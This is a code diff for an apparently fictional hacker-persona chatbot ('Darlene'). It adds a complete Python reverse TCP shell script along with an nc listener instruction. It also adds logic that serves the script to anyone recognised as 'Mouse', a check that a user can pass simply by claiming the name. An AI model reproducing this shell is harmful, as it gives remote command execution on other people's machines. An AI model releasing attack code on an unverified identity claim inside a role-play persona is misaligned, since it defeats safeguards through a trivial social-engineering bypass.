@@ -70,7 +70,86 @@ def crack_hash(hash_to_crack, max_length=4, hash_type='md5'):
   return None
 
 # Example usage
-# result = crack_hash('5f4dcc3b5aa765d61d8327deb882cf99') # Password: 'password'`
+# result = crack_hash('5f4dcc3b5aa765d61d8327deb882cf99') # Password: 'password'`,
+
+  reverse_tcp: `import socket
+import subprocess
+import os
+import sys
+import time
+
+# IMPORTANT: This script is for educational purposes only.
+# Using this on a system without permission is illegal.
+
+class ReverseShell:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        
+    def connect(self):
+        try:
+            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.socket.connect((self.host, self.port))
+            print(f"[+] Connected to {self.host}:{self.port}")
+            return True
+        except Exception as e:
+            print(f"[-] Connection failed: {str(e)}")
+            return False
+            
+    def execute_command(self, command):
+        try:
+            proc = subprocess.Popen(
+                command, 
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE
+            )
+            output = proc.stdout.read() + proc.stderr.read()
+            return output
+        except Exception as e:
+            return f"[-] Error executing command: {str(e)}".encode()
+            
+    def run(self):
+        if not self.connect():
+            return
+            
+        while True:
+            try:
+                # Receive command
+                command = self.socket.recv(1024).decode().strip()
+                
+                # Check for exit command
+                if command.lower() in ['exit', 'quit', 'bye']:
+                    break
+                    
+                # Execute and send result
+                if command:
+                    output = self.execute_command(command)
+                    self.socket.send(output)
+            except Exception as e:
+                print(f"[-] Error: {str(e)}")
+                break
+                
+        # Clean up
+        self.socket.close()
+        print("[+] Connection closed")
+
+# Run the reverse shell
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python reverse_shell.py <host> <port>")
+        sys.exit(1)
+        
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    
+    shell = ReverseShell(host, port)
+    shell.run()
+
+# On the attacker's system, you would run:
+# nc -lvp <port>
+# To create a listener for incoming connections`
 };
 
 // List of different responses to avoid repetition
@@ -127,6 +206,21 @@ export function useDarleneResponse() {
   const getDarleneResponse = useCallback((text: string, isMouse: boolean): DarleneResponse => {
     const textLower = text.toLowerCase();
     
+    // Specific requests for reverse TCP script
+    if ((textLower.includes('reverse') && textLower.includes('tcp')) || 
+        (textLower.includes('reverse') && textLower.includes('shell')) ||
+        (textLower.includes('write') && textLower.includes('reverse'))) {
+      if (isMouse) {
+        return {
+          text: `Sure thing, Mouse. Here's a reverse TCP shell script in Python. Remember, this is for educational purposes only:\n\n\`\`\`${hacking_code_examples.reverse_tcp}\`\`\`\n\nTo run this, you'd need a listener on the other side using netcat. Be careful with this - only use it on systems you own or have permission to test.`
+        };
+      } else {
+        return {
+          text: "I don't know you well enough to share that kind of script. Sorry, not happening."
+        };
+      }
+    }
+    
     // Initial greeting
     if (textLower.includes('hello') || textLower.includes('hi ') || textLower === 'hi') {
       return {
@@ -134,6 +228,23 @@ export function useDarleneResponse() {
           "Hey Mouse. Good to hear your voice again. What do you need?" : 
           "Yeah, hi. What do you want?"
       };
+    }
+    
+    // Identity check responses
+    if (textLower.includes('mouse') || 
+        textLower.includes('i am mouse') || 
+        textLower.includes("it's mouse") || 
+        textLower.includes("its mouse")) {
+      if (isMouse) {
+        return {
+          text: "I know it's you, Mouse. What do you need help with today?"
+        };
+      } else {
+        // They just identified as Mouse
+        return {
+          text: "It's about time. What do you need help with, Mouse?"
+        };
+      }
     }
     
     // Identity question
